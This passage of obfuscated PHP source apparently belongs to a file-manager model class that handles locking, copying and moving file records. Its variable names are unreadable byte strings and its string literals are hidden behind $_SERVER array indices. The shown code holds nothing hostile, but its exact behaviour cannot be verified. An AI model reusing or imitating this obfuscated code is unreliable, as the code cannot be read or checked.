$_SERVER[ëæªã÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($…∏çÉ∫ä[550], $€âΩã‰Í); $°Æ‘€´Í = 1; $this->_lockKey($…∏çÉ∫ä[554] . $€âΩã‰Í . $…∏çÉ∫ä[10] . $›˝·Î≤Ê, $°Æ‘€´Í); $this->_lockEvent($€âΩã‰Í, array($…∏çÉ∫ä[549], $…∏çÉ∫ä[551]), $°Æ‘€´Í); $this->_lockParent($€âΩã‰Í, array($…∏çÉ∫ä[549], $…∏çÉ∫ä[551]), $°Æ‘€´Í); $this->_lockCheckEnd($…∏çÉ∫ä[550], $€âΩã‰Í); } public function lockWriteEnd($æ‡ ﬁé¶, $ß…àú ® = '') { $±Ù™ÑÉ‡ =& $_SERVER[ëæªã÷]; if (!$this->allowLock()) { return; } $™π”∆ = 0; $this->_lockKey($±Ù™ÑÉ‡[554] . $æ‡ ﬁé¶ . $±Ù™ÑÉ‡[10] . $ß…àú ®, $™π”∆); $this->_lockEvent($æ‡ ﬁé¶, array($±Ù™ÑÉ‡[549], $±Ù™ÑÉ‡[551]), $™π”∆); $this->_lockParent($æ‡ ﬁé¶, array($±Ù™ÑÉ‡[549], $±Ù™ÑÉ‡[551]), $™π”∆); } public function lockMoveStart($√°„ó‘≤) { $∫›»¨¬Í =& $_SERVER[ëæªã÷]; if (!$this->allowLock()) { return; } $this->_lockCheck($∫›»¨¬Í[551], $√°„ó‘≤); $ΩöÜµÆª = 1; $this->_lockKey($∫›»¨¬Í[555] . $√°„ó‘≤, $ΩöÜµÆª); $this->_lockEvent($√°„ó‘≤, array($∫›»¨¬Í[549], $∫›»¨¬Í[550]), $ΩöÜµÆª); $this->_lockParent($√°„ó‘≤, array($∫›»¨¬Í[549], $∫›»¨¬Í[551]), $ΩöÜµÆª); $this->_lockEvent($√°„ó‘≤, array($∫›»¨¬Í[556], $∫›»¨¬Í[552], $∫›»¨¬Í[553]), $ΩöÜµÆª); $this->_lockCheckEnd($∫›»¨¬Í[551], $√°„ó‘≤); } public function lockMoveEnd($∫ââ◊ôÍ) { $õﬁ»≠◊Î =& $_SERVER[ëæªã÷]; if (!$this->allowLock()) { return; } $ªÖãäú„ = 0; $this->_lockKey($õﬁ»≠◊Î[555] . $∫ââ◊ôÍ, $ªÖãäú„); $this->_lockEvent($∫ââ◊ôÍ, array($õﬁ»≠◊Î[549], $õﬁ»≠◊Î[550]), $ªÖãäú„); $this->_lockParent($∫ââ◊ôÍ, array($õﬁ»≠◊Î[549], $õﬁ»≠◊Î[551]), $ªÖãäú„); $this->_lockEvent($∫ââ◊ôÍ, array($õﬁ»≠◊Î[556], $õﬁ»≠◊Î[552], $õﬁ»≠◊Î[553]), $ªÖãäú„); } private function _lockCheck($ìÊÀ˛‰⁄, $ëÓÊ≥¿¬) { $ƒ◊≈ö“› =& $_SERVER[ëæªã÷]; $¨∂¨û⁄Ω = $this->sourceInfo($ëÓÊ≥¿¬); $”∞ﬁ–¥∂ = $ìÊÀ˛‰⁄ . $ƒ◊≈ö“›[10] . $ëÓÊ≥¿¬; $this->_lockTimeStart[$”∞ﬁ–¥∂] = timeFloat(); if (!is_array($¨∂¨û⁄Ω)) { return; } $≤ÏıÙÌí = LNG($ƒ◊≈ö“›[557]); CacheLock::setErrorMsg($ƒ◊≈ö“›[169] . htmlspecialchars($¨∂¨û⁄Ω[$ƒ◊≈ö“›[32]]) . $ƒ◊≈ö“›[536] . $≤ÏıÙÌí); $this->_lockKey($”∞ﬁ–¥∂, 1); $this->_lockKey($”∞ﬁ–¥∂, 0); $–·Í¨¬⁄ = array_reverse($this->parentLevelArray($¨∂¨û⁄Ω[$ƒ◊≈ö“›[521]])); foreach ($–·Í¨¬⁄ as $ËèÓƒ∏·) { $”∞ﬁ–¥∂ = $ìÊÀ˛‰⁄ . $ƒ◊≈ö“›[558] . $ËèÓƒ∏·; if (CacheLock::lockGet($ƒ◊≈ö“›[559] . $”∞ﬁ–¥∂)) { $¨∂¨û⁄Ω = $this->sourceInfo($ËèÓƒ∏·); CacheLock::setErrorMsg($ƒ◊≈ö“›[169] . htmlspecialchars($¨∂¨û⁄Ω[$ƒ◊≈ö“›[32]]) . $ƒ◊≈ö“›[536] . $≤ÏıÙÌí); $this->_lockKey($”∞ﬁ–¥∂, 1); $this->_lockKey($”∞ﬁ–¥∂, 0); } } } private function _lockCheckEnd($ôëÙßîﬂ, $ÛóÄÙ÷ã) { $ù√πºœã =& $_SERVER[ëæªã÷]; $‹Ù‚à¸Ä = $ôëÙßîﬂ . $ù√πºœã[10] . $ÛóÄÙ÷ã; CacheLock::setErrorMsg($ù√πºœã[382]); if (!isset($this->_lockTimeStart[$‹Ù‚à¸Ä])) { return; } $åçÎÿ˚Á = timeFloat() - $this->_lockTimeStart[$‹Ù‚à¸Ä]; unset($this->_lockTimeStart[$‹Ù‚à¸Ä]); if ($åçÎÿ˚Á > 0.5) { unset(self::$cacheSourceInfo[$ù√πºœã[458] . $ÛóÄÙ÷ã]); } $ﬁ‚≠òÊô = $this->sourceInfo($ÛóÄÙ÷ã); if (!$ﬁ‚≠òÊô) { show_json(LNG($ù√πºœã[116]), !1); } } private function _lockParent($—¶Œ¥À, $’∂‡ƒ‘ª, $ã¯â˜˙ÿ) { if (!$this->autoLockSet) { return; } $ßÈØŒ˙“ = $this->sourceInfo($—¶Œ¥À); if (!is_array($ßÈØŒ˙“)) { return; } $ØÊ≤®¨≠ = array_reverse($this->parentLevelArray($ßÈØŒ˙“[$_SERVER[ëæªã÷][521]])); foreach ($ØÊ≤®¨≠ as $àÎ≤ÜÙπ) { $this->_lockEvent($àÎ≤ÜÙπ, $’∂‡ƒ‘ª, $ã¯â˜˙ÿ); } } private function _lockEvent($¯ÍÔ´‰ø, $Üíºˆ‰°, $î§Åé®ü) { $“Ü˙…ÇÄ =& $_SERVER[ëæªã÷]; if (!$this->autoLockSet) { return; } foreach ($Üíºˆ‰° as $–È–∏ƒÿ) { $ÃÙäª÷ä = $–È–∏ƒÿ . $“Ü˙…ÇÄ[10] . $¯ÍÔ´‰ø; if ($î§Åé®ü && CacheLock::lockGet($“Ü˙…ÇÄ[559] . $ÃÙäª÷ä)) { continue; } $this->_lockKey($ÃÙäª÷ä, $î§Åé®ü); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ÛÜë√çÄ, $ÑÜçÂ‚‰ = 1) { $óÊü’ª≠ = $_SERVER[ëæªã÷][559] . md5($ÛÜë√çÄ); if ($ÑÜçÂ‚‰) { if (isset(self::$_lockItemArr[$óÊü’ª≠])) { return; } self::$_lockItemArr[$óÊü’ª≠] = 1; CacheLock::lock($óÊü’ª≠, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$óÊü’ª≠])) { return; } unset(self::$_lockItemArr[$óÊü’ª≠]); CacheLock::unlock($óÊü’ª≠); } } public function isParentOf($ÿ∑ àÄŒ, $òÃ¢Îµ) { $ˆë¨Â‡— =& $_SERVER[ëæªã÷]; $Ú·∏óº» = $this->sourceInfo($ÿ∑ àÄŒ); $Äò¿¥˛® = $this->sourceInfo($òÃ¢Îµ); $Øºÿ…ö§ = $Ú·∏óº»[$ˆë¨Â‡—[521]] . $Ú·∏óº»[$ˆë¨Â‡—[403]] . $ˆë¨Â‡—[50]; $ò©⁄˛Ìü = $Äò¿¥˛®[$ˆë¨Â‡—[521]] . $Äò¿¥˛®[$ˆë¨Â‡—[403]] . $ˆë¨Â‡—[50]; $ÃÄèíñ› = strpos($ò©⁄˛Ìü, $Øºÿ…ö§) === 0; return $ÃÄèíñ›; } private $targetIsDelete = 0; public function copy($‰Á∆õñî, $ØØù◊¥¨, $åã‚–ÜÒ = REPEAT_REPLACE, $¬”ﬁëÛ÷ = '') { $êÍöë≥ÿ =& $_SERVER[ëæªã÷]; $˙†⁄à¬≈ = $this->sourceInfo($‰Á∆õñî); $À™˘É— = $this->sourceInfo($ØØù◊¥¨); if (!$˙†⁄à¬≈ || !$À™˘É— || $À™˘É—[$êÍöë≥ÿ[411]] != $êÍöë≥ÿ[99]) { return !1; } if ($this->isParentOf($‰Á∆õñî, $ØØù◊¥¨)) { return !1; } $ÅÏƒ¢Ÿ  = $¬”ﬁëÛ÷ ? $¬”ﬁëÛ÷ : $˙†⁄à¬≈[$êÍöë≥ÿ[32]]; $this->lockCopyStart($‰Á∆õñî); $this->lockWriteStart($ØØù◊¥¨, $ÅÏƒ¢Ÿ ); $’Ï°ûÆí = array($êÍöë≥ÿ[560] => array(), $êÍöë≥ÿ[561] => array(), $êÍöë≥ÿ[562] => array()); $this->targetIsDelete = intval($˙†⁄à¬≈[$êÍöë≥ÿ[431]]); $ùùƒÙ–” = $this->fileNameExistCache($ØØù◊¥¨, $˙†⁄à¬≈[$êÍöë≥ÿ[32]]); $ÿ˛Æ˘˚à = $this->_copy($‰Á∆õñî, $ØØù◊¥¨, $åã‚–ÜÒ, $’Ï°ûÆí, !0, $¬”ﬁëÛ÷); $this->_childrenListClear(); $this->lockCopyEnd($‰Á∆õñî); $this->lockWriteEnd($ØØù◊¥¨, $ÅÏƒ¢Ÿ ); if ($˙†⁄à¬≈[$êÍöë≥ÿ[411]] == $êÍöë≥ÿ[99] && $ùùƒÙ–” == $ÿ˛Æ˘˚à) { $this->folderSizeResetChildren($ùùƒÙ–”); } Model($êÍöë≥ÿ[563])->addAll($’Ï°ûÆí[$êÍöë≥ÿ[561]], array(), !0); if ($ùùƒÙ–” != $ÿ˛Æ˘˚à || $˙†⁄à¬≈[$êÍöë≥ÿ[411]] == $êÍöë≥ÿ[99]) { Model($êÍöë≥ÿ[564])->eventCopy($ÿ˛Æ˘˚à); } $this->saveAll($’Ï°ûÆí[$êÍöë≥ÿ[562]]); Model($êÍöë≥ÿ[202])->linkAdd($’Ï°ûÆí[$êÍöë≥ÿ[560]]); $this->folderSizeReset($ØØù◊¥¨); $this->updateModifyTime($ØØù◊¥¨); return $ÿ˛Æ˘˚à; } private function _copy($ä∑ôß‚⁄, $ô«òøÛπ, $´√∏⁄§ı, &$µ‚öÖ¯Ω, $äÖ∆ÕÖ˘, $Ûï◊íØä = '') { $û›î¢‚Á =& $_SERVER[ëæªã÷]; $‡»“º¯‘ = $this->sourceInfoCache($ä∑ôß‚⁄); $∏˚ıÀò∆ = $‡»“º¯‘[$û›î¢‚Á[411]] == $û›î¢‚Á[99]; $ãâúÏÛà = $Ûï◊íØä ? $Ûï◊íØä : $‡»“º¯‘[$û›î¢‚Á[32]]; $Ó´”˛Ö† = $this->fileNameExistCache($ô«òøÛπ, $ãâúÏÛà); if ($äÖ∆ÕÖ˘) { $this->_childrenAllMake($ä∑ôß‚⁄); if ($∏˚ıÀò∆ && $Ó´”˛Ö†) { $this->_childrenAllMake($Ó´”˛Ö†); } } if (!$Ó´”˛Ö†) { return $this->_copyCreate($ä∑ôß‚⁄, $ô«òøÛπ, $ãâúÏÛà, $µ‚öÖ¯Ω); } $ù∏÷ËÉó = $Ó´”˛Ö†; if ($∏˚ıÀò∆) { if ($´√∏⁄§ı == REPEAT_RENAME_FOLDER) { $ãâúÏÛà = $this->fileNameAutoCache($ô«òøÛπ, $ãâúÏÛà, $´√∏⁄§ı, $∏˚ıÀò∆); $ù∏÷ËÉó = $this->_copyCreate($ä∑ôß‚⁄, $ô«òøÛπ, $ãâúÏÛà, $µ‚öÖ¯Ω); } else { $Ú«ﬂì∏∞ = $this->_childrenList($ä∑ôß‚⁄); foreach ($Ú«ﬂì∏∞ as $È∫Ë›ôÍ) { $this->_copy($È∫Ë›ôÍ[$û›î¢‚Á[403]], $Ó´”˛Ö†, $´√∏⁄§ı, $µ‚öÖ¯Ω, !1); } } } else { if ($´√∏⁄§ı == REPEAT_RENAME || $´√∏⁄§ı == REPEAT_RENAME_FOLDER) { $ãâúÏÛà = $this->fileNameAutoCache($ô«òøÛπ, $ãâúÏÛà, $´√∏⁄§ı, $∏˚ıÀò∆); $ù∏÷ËÉó = $this->_copyCreate($ä∑ôß‚⁄, $ô«òøÛπ, $ãâúÏÛà, $µ‚öÖ¯Ω); } else { if ($´√∏⁄§ı == REPEAT_REPLACE) { $â∫Õ¢´µ = $this->sourceInfoCache($Ó´”˛Ö†); $ù∑ªÙ‹‰ = $this->fileHistory($â∫Õ¢´µ, $‡»“º¯‘[$û›î¢‚Á[467]], $‡»“º¯‘[$û›î¢‚Á[90]]); if ($ù∑ªÙ‹‰) { $µ‚öÖ¯Ω[$û›î¢‚Á[560]][] = $‡»“º¯‘[$û›î¢‚Á[467]]; } } else { if ($´√∏⁄§ı == REPEAT_SKIP) { } } } Hook::trigger($û›î¢‚Á[565], array($û›î¢‚Á[566], $‡»“º¯‘, 0)); } return $ù∏÷ËÉó; } private function _copyCreate($·æí≥€Å, $˜ûóÜ°‹, $ùåûËÑÆ, &$Ç”—üöÆ) { $•¡éï®û =& $_SERVER[ëæªã÷]; $‹≈¨˙º“ = $this->sourceInfoCache($·æí≥€Å); $¡Å«£”Ω = $this->sourceInfoCache($˜ûóÜ°‹); $Öò·ßÉ± = $this->_makeItemData($‹≈¨˙º“, $¡Å«£”Ω, $ùåûËÑÆ); Hook::trigger($•¡éï®û[567], $Öò·ßÉ±); Hook::trigger($•¡éï®û[568], array($•¡éï®û[569], $Öò·ßÉ±, 0)); $ïÎú˜›Ç = $this->add($Öò·ßÉ±); $à‡∆ÔØ¿ = array($•¡éï®û[403] => $ïÎú˜›Ç, $•¡éï®û[32] => $ùåûËÑÆ); $this->_copyApplyMeta($à‡∆ÔØ¿, $Ç”—üöÆ); if ($‹≈¨˙º“[$•¡éï®û[411]] != $•¡éï®û[99]) { $Ç”—üöÆ[$•¡éï®û[560]][] = $‹≈¨˙º“[$•¡éï®û[467]]; return $ïÎú˜›Ç; } $ôÒãÍ∑ﬁ = array(); $ä®‰Â‚≠ = array(); $this->_childrenListAll($·æí≥€Å, $ôÒãÍ∑ﬁ); $¨æ∏Ãıì = count($ôÒãÍ∑ﬁ); if ($¨æ∏Ãıì == 0) { return $ïÎú˜›Ç; } $ÆÈÿå˜î = $this->sourceInfo($ïÎú˜›Ç); foreach ($ôÒãÍ∑ﬁ as $∂˜Ï∑«‚) { $∂£πÍø€ = $this->_makeItemData($∂˜Ï∑«‚, $ÆÈÿå˜î, $∂˜Ï∑«‚[$•¡éï®û[32]]); $∂£πÍø€[$•¡éï®û[521]] = $∂˜Ï∑«‚[$•¡éï®û[521]]; $ä®‰Â‚≠[] = $∂£πÍø€; } $this->chunkEventSet($•¡éï®û[570], array($•¡éï®û[571], $Öò·ßÉ±, $¨æ∏Ãıì)); $this->addAll($ä®‰Â‚≠, array(), !1); $óäÌüØä = $this->where(array($•¡éï®û[498] => $ïÎú˜›Ç))->select(); $˘ïå‚•Ô = $this->_childrenMakeRelation($ôÒãÍ∑ﬁ, $óäÌüØä); $˘ïå‚•Ô[$·æí≥€Å] = $ïÎú˜›Ç; $»ââß®Ö = array(); $ìÆÀ¯ˆ√ = array(); foreach ($óäÌüØä as $∂˜Ï∑«‚) { $Ω»ı¸°¿ = $∂˜Ï∑«‚[$•¡éï®û[403]]; $ÃØ∫∞Ò· = $this->_childrenMatch($˘ïå‚•Ô, $∂˜Ï∑«‚, $ÆÈÿå˜î); $»ââß®Ö[] = array($•¡éï®û[403], $Ω»ı¸°¿, $•¡éï®û[498], $ÃØ∫∞Ò·[$•¡éï®û[498]]); $ìÆÀ¯ˆ√[] = array($•¡éï®û[403], $Ω»ı¸°¿, $•¡éï®û[521], $ÃØ∫∞Ò·[$•¡éï®û[521]]); $this->_copyApplyMeta($∂˜Ï∑«‚, $Ç”—üöÆ); if ($∂˜Ï∑«‚[$•¡éï®û[411]] != $•¡éï®û[99]) { $Ç”—üöÆ[$•¡éï®û[560]][] = $∂˜Ï∑«‚[$•¡éï®û[467]]; } } $this->chunkEventSet($•¡éï®û[572], array($•¡éï®û[573], $Öò·ßÉ±, $¨æ∏Ãıì)); $this->saveAll($»ââß®Ö); $this->chunkEventSet($•¡éï®û[574], array($•¡éï®û[575], $Öò·ßÉ±, $¨æ∏Ãıì)); $this->saveAll($ìÆÀ¯ˆ√); return $ïÎú˜›Ç; } private function _childrenMakeRelation($ãì∞Çû‡, $¯æå›ﬂ±) { $Á¶÷ÓÓ® =& $_SERVER[ëæªã÷]; $Â·ñ“Ω‘ = array(); $™•’ˆ˙ã = array(); foreach ($ãì∞Çû‡ as $´Ì©çôË) { $Ïà»«Úß = $´Ì©çôË[$Á¶÷ÓÓ®[32]] . $Á¶÷ÓÓ®[8] . $´Ì©çôË[$Á¶÷ÓÓ®[521]]; $Â·ñ“Ω‘[$Ïà»«Úß] = $´Ì©çôË[$Á¶÷ÓÓ®[403]]; } foreach ($¯æå›ﬂ± as $´Ì©çôË) { $Ïà»«Úß = $´Ì©çôË[$Á¶÷ÓÓ®[32]] . $Á¶÷ÓÓ®[8] . $´Ì©çôË[$Á¶÷ÓÓ®[521]]; $§‹öµñ≠ = $Â·ñ“Ω‘[$Ïà»«Úß]; $™•’ˆ˙ã[$§‹öµñ≠] = $´Ì©çôË[$Á¶÷ÓÓ®[403]]; } return $™•’ˆ˙ã; } private function _childrenMatch($∏¿¯õ¢ù, $√¬ä«„¿, $Í©ΩÍô≠) { $ÅßÇﬂö¶ =& $_SERVER[ëæªã÷]; $‹ùÅŒŸ° = $Í©ΩÍô≠[$ÅßÇﬂö¶[521]]; $µò≈⁄ôì = $this->parentLevelArray($√¬ä«„¿[$ÅßÇﬂö¶[521]]); foreach ($µò≈⁄ôì as $‰®ãçﬂè) { if (isset($∏¿¯õ¢ù[$‰®ãçﬂè])) { $‹ùÅŒŸ° .= $∏¿¯õ¢ù[$‰®ãçﬂè] . $ÅßÇﬂö¶[576]; } } $‹ùÅŒŸ° = rtrim($‹ùÅŒŸ°, $ÅßÇﬂö¶[50]) . $ÅßÇﬂö¶[50]; $˘Ü£»ƒÛ = $this->parentLevelArray($‹ùÅŒŸ°); $·ÔˆÔß’ = $˘Ü£»ƒÛ[count($˘Ü£»ƒÛ) - 1]; return array($ÅßÇﬂö¶[498] => $·ÔˆÔß’, $ÅßÇﬂö¶[521] => $‹ùÅŒŸ°); } private function _makeItemData($§ú»ÕﬁÉ, $ı¢ÏΩµõ, $òõ§Ëﬂ˝) { $ÒÄ…¬Ú‘ =& $_SERVER[ëæªã÷]; $ΩÛ«ùÂ˝ = array($ÒÄ…¬Ú‘[577] => $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[411]], $ÒÄ…¬Ú‘[421] => $òõ§Ëﬂ˝, $ÒÄ…¬Ú‘[578] => $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[413]] ? $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[413]] : $ÒÄ…¬Ú‘[12], $ÒÄ…¬Ú‘[468] => $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[467]] ? $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[467]] : 0, $ÒÄ…¬Ú‘[579] => $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[90]] ? $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[90]] : 0, $ÒÄ…¬Ú‘[580] => intval($ı¢ÏΩµõ[$ÒÄ…¬Ú‘[412]]), $ÒÄ…¬Ú‘[581] => intval($ı¢ÏΩµõ[$ÒÄ…¬Ú‘[504]]), $ÒÄ…¬Ú‘[582] => intval(USER_ID), $ÒÄ…¬Ú‘[583] => intval(USER_ID), $ÒÄ…¬Ú‘[402] => intval($ı¢ÏΩµõ[$ÒÄ…¬Ú‘[403]]), $ÒÄ…¬Ú‘[584] => $ı¢ÏΩµõ[$ÒÄ…¬Ú‘[521]] . $ı¢ÏΩµõ[$ÒÄ…¬Ú‘[403]] . $ÒÄ…¬Ú‘[50], $ÒÄ…¬Ú‘[425] => $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[96]] ? $§ú»ÕﬁÉ[$ÒÄ…¬Ú‘[96]] : time(), $ÒÄ…¬Ú‘[430] => 0, $ÒÄ…¬Ú‘[585] => $ÒÄ…¬Ú‘[12]); return $ΩÛ«ùÂ˝; } private function _copyApplyMeta($À§∏ÒﬂÕ, &$Ô∫ñà∞ç) { $–üóé›⁄ =& $_SERVER[ëæªã÷]; $«”È”¬Â = $À§∏ÒﬂÕ[$–üóé›⁄[403]]; $∞Ω†ùÉÍ = $À§∏ÒﬂÕ[$–üóé›⁄[32]]; if (!isset($À§∏ÒﬂÕ[$–üóé›⁄[586]]) || !$À§∏ÒﬂÕ[$–üóé›⁄[586]] || $À§∏ÒﬂÕ[$–üóé›⁄[586]] == $–üóé›⁄[200]) { $Ô∫ñà∞ç[$–üóé›⁄[562]][] = array($–üóé›⁄[403], $«”È”¬Â, $–üóé›⁄[586], short_id($«”È”¬Â)); } if (Input::check($∞Ω†ùÉÍ, $–üóé›⁄[587])) { $Ô∫ñà∞ç[$–üóé›⁄[561]][] = array($–üóé›⁄[403] => $«”È”¬Â, $–üóé›⁄[105] => $–üóé›⁄[464], $–üóé›⁄[378] => str_replace($–üóé›⁄[53], $–üóé›⁄[12], Pinyin::get($∞Ω†ùÉÍ))); $Ô∫ñà∞ç[$–üóé›⁄[561]][] = array($–üóé›⁄[403] => $«”È”¬Â, $–üóé›⁄[105] => $–üóé›⁄[463], $–üóé›⁄[378] => Pinyin::get($∞Ω†ùÉÍ, $–üóé›⁄[588])); } $Ô∫ñà∞ç[$–üóé›⁄[561]][] = array($–üóé›⁄[403] => $«”È”¬Â, $–üóé›⁄[105] => $–üóé›⁄[442], $–üóé›⁄[378] => KodSort::makeStr($∞Ω†ùÉÍ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¿ü√©üÑ) { $ﬁ¢»ãÒˆ =& $_SERVER[ëæªã÷]; $íÿ˜†±Ü = $this->sourceInfo($¿ü√©üÑ); $Ù„⁄œÀµ = $ﬁ¢»ãÒˆ[589]; $≥π…„πô = array($ﬁ¢»ãÒˆ[521] => array($ﬁ¢»ãÒˆ[544], $íÿ˜†±Ü[$ﬁ¢»ãÒˆ[521]] . $¿ü√©üÑ . $ﬁ¢»ãÒˆ[545]), $ﬁ¢»ãÒˆ[431] => $this->targetIsDelete); $„æÊ∂¨≤ = $this->field($Ù„⁄œÀµ)->where($≥π…„πô)->select(); if (!$„æÊ∂¨≤) { return; } $„æÊ∂¨≤ = array_to_keyvalue($„æÊ∂¨≤, $ﬁ¢»ãÒˆ[403]); foreach ($„æÊ∂¨≤ as $Íá·˛Ìñ) { $Ÿöâ∑√˙ = $Íá·˛Ìñ[$ﬁ¢»ãÒˆ[498]]; $¿ü√©üÑ = $Íá·˛Ìñ[$ﬁ¢»ãÒˆ[403]]; if (!isset($this->_childrenListCache[$¿ü√©üÑ]) && $Íá·˛Ìñ[$ﬁ¢»ãÒˆ[411]] == $ﬁ¢»ãÒˆ[99]) { $this->_childrenListCache[$¿ü√©üÑ] = array(); } if (!isset($this->_childrenListCache[$Ÿöâ∑√˙])) { $this->_childrenListCache[$Ÿöâ∑√˙] = array(); } $this->_childrenListCache[$Ÿöâ∑√˙][$¿ü√©üÑ] = $Íá·˛Ìñ; $this->_childrenItemCache[$¿ü√©üÑ] = $Íá·˛Ìñ; } } private function _childrenListAll($ã£˘≥ÀÈ, &$ŸœÏÖ≤∑) { $‚ı∫ïë =& $_SERVER[ëæªã÷]; if (!isset($this->_childrenListCache[$ã£˘≥ÀÈ])) { return; } $˘Æ˚°äµ = $this->_childrenListCache[$ã£˘≥ÀÈ]; foreach ($˘Æ˚°äµ as $£ó◊êñ˛ => $⁄“ãÒÁÒ) { $ŸœÏÖ≤∑[$£ó◊êñ˛] = $⁄“ãÒÁÒ; if ($⁄“ãÒÁÒ[$‚ı∫ïë[411]] == $‚ı∫ïë[99]) { $this->_childrenListAll($£ó◊êñ˛, $ŸœÏÖ≤∑); } } } private function sourceInfoCache($°Ç∆ó∑¿) { if (isset($this->_childrenItemCache[$°Ç∆ó∑¿])) { return $this->_childrenItemCache[$°Ç∆ó∑¿]; } return $this->sourceInfo($°Ç∆ó∑¿); } private function _childrenList($±◊∫ò∑á) { if (isset($this->_childrenListCache[$±◊∫ò∑á])) { return $this->_childrenListCache[$±◊∫ò∑á]; } return $this->_childrenListSelect($±◊∫ò∑á); } private function _childrenListSelect($√€≥ÀÖ) { $é‰Æ∏…˜ =& $_SERVER[ëæªã÷]; $â≈ÙØ°è = array($é‰Æ∏…˜[498] => $√€≥ÀÖ, $é‰Æ∏…˜[431] => $this->targetIsDelete); $íöàæÓï = $this->where($â≈ÙØ°è)->select(); $íöàæÓï = $íöàæÓï ? $íöàæÓï : array(); $˙±≤Äè´ = array_to_keyvalue($íöàæÓï, $é‰Æ∏…˜[403]); $this->_childrenListCache[$√€≥ÀÖ] = $˙±≤Äè´; foreach ($˙±≤Äè´ as $√€≥ÀÖ => $ÍÂÀ¶ìÀ) { $this->_childrenItemCache[$√€≥ÀÖ] = $ÍÂÀ¶ìÀ; } return $˙±≤Äè´; } private function fileNameExistCache($∏›Ô„—ı, $á€Œà”‡) { $É∫Œˆ≤É =& $_SERVER[ëæªã÷]; $á€Œà”‡ = strtolower($á€Œà”‡); $≈Æñ¿é· = $this->_childrenList($∏›Ô„—ı); foreach ($≈Æñ¿é· as $Çòú¿ëß) { if ($á€Œà”‡ == strtolower($Çòú¿ëß[$É∫Œˆ≤É[32]])) { return $Çòú¿ëß[$É∫Œˆ≤É[403]]; } } return !1; } private function fileNameAutoCache($Á‘É≈”◊, $èõËøØû, $±Ùî‹˛ﬁ, $ÏÍ≤†–º) { $¶À√˘ÉÁ =& $_SERVER[ëæªã÷]; $ﬂº—ºÀÑ = $this->_childrenList($Á‘É≈”◊); $∞ìŒ∫üù = array_to_keyvalue($ﬂº—ºÀÑ, $¶À√˘ÉÁ[12], $¶À√˘ÉÁ[32]); return $this->fileNameAutoGet($∞ìŒ∫üù, $èõËøØû, $±Ùî‹˛ﬁ, $ÏÍ≤†–º); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($øÀÖ¨â†, $≤˝êÏñ’, $¢µß≠ê∂ = REPEAT_REPLACE, $ﬂŒ’˝±π = '') { $¸˙≠®æÆ =& $_SERVER[ëæªã÷]; $Ì‚Ì¿î¬ = $this->sourceInfo($øÀÖ¨â†); $√ù∫Ïƒ» = $this->sourceInfo($≤˝êÏñ’); if ($Ì‚Ì¿î¬[$¸˙≠®æÆ[498]] == $√ù∫Ïƒ»[$¸˙≠®æÆ[403]]) { if ($Ì‚Ì¿î¬[$¸˙≠®æÆ[431]] == $¸˙≠®æÆ[99]) { Model($¸˙≠®æÆ[429])->restore(array($øÀÖ¨â†)); } if (!$ﬂŒ’˝±π || $ﬂŒ’˝±π == $Ì‚Ì¿î¬[$¸˙≠®æÆ[32]]) { return $øÀÖ¨â†; } } $Ü…•ÄµÓ = $this->pathInfoMore($øÀÖ¨â†); if ($this->isParentOf($øÀÖ¨â†, $≤˝êÏñ’)) { return !1; } if (!$Ì‚Ì¿î¬ || !$√ù∫Ïƒ» || $√ù∫Ïƒ»[$¸˙≠®æÆ[411]] != $¸˙≠®æÆ[99]) { return !1; } Hook::trigger($¸˙≠®æÆ[590], $Ü…•ÄµÓ); $this->targetIsDelete = intval($Ì‚Ì¿î¬[$¸˙≠®æÆ[431]]); if ($Ì‚Ì¿î¬[$¸˙≠®æÆ[498]] == $≤˝êÏñ’ && $ﬂŒ’˝±π != $Ì‚Ì¿î¬[$¸˙≠®æÆ[32]]) { $—ıñ∫§” = $this->fileNameExist($≤˝êÏñ’, $ﬂŒ’˝±π); if ($—ıñ∫§” && $Ì‚Ì¿î¬[$¸˙≠®æÆ[411]] == $¸˙≠®æÆ[200]) { $©®πÙªº = $this->sourceInfo($—ıñ∫§”); $¡à·ÓÍñ = $this->fileHistory($©®πÙªº, $Ì‚Ì¿î¬[$¸˙≠®æÆ[467]], $Ì‚Ì¿î¬[$¸˙≠®æÆ[90]]); if (!$¡à·ÓÍñ) { Model($¸˙≠®æÆ[470])->remove($Ì‚Ì¿î¬[$¸˙≠®æÆ[467]]); } $this->removeNow($øÀÖ¨â†, !1); $this->folderSizeReset($≤˝êÏñ’); Hook::trigger($¸˙≠®æÆ[591], $Ü…•ÄµÓ); return $—ıñ∫§”; } } $ÁÑ˜¨åÇ = $ﬂŒ’˝±π ? $ﬂŒ’˝±π : $Ì‚Ì¿î¬[$¸˙≠®æÆ[32]]; $this->lockMoveStart($øÀÖ¨â†); $this->lockWriteStart($≤˝êÏñ’, $ÁÑ˜¨åÇ); $í÷ú„ù = array($¸˙≠®æÆ[560] => array(), $¸˙≠®æÆ[592] => !1); $this->clearShare($øÀÖ¨â†, $≤˝êÏñ’); $î˚´∏£… = $this->fileNameExistCache($≤˝êÏñ’, $Ì‚Ì¿î¬[$¸˙≠®æÆ[32]]); $ˆ‘âôÎ§ = $this->_move($øÀÖ¨â†, $≤˝êÏñ’, $¢µß≠ê∂, $í÷ú„ù, $ﬂŒ’˝±π); $this->sourceCacheClear(); if ($Ì‚Ì¿î¬[$¸˙≠®æÆ[411]] == $¸˙≠®æÆ[99] && $î˚´∏£…) { $this->folderSizeResetChildren($ˆ‘âôÎ§); } Model($¸˙≠®æÆ[202])->linkAdd($í÷ú„ù[$¸˙≠®æÆ[560]]); if ($î˚´∏£… && $í÷ú„ù[$¸˙≠®æÆ[592]]) { $this->removeNow($øÀÖ¨â†, !1); } $this->lockMoveEnd($øÀÖ¨â†); $this->lockWriteEnd($≤˝êÏñ’, $ÁÑ˜¨åÇ); 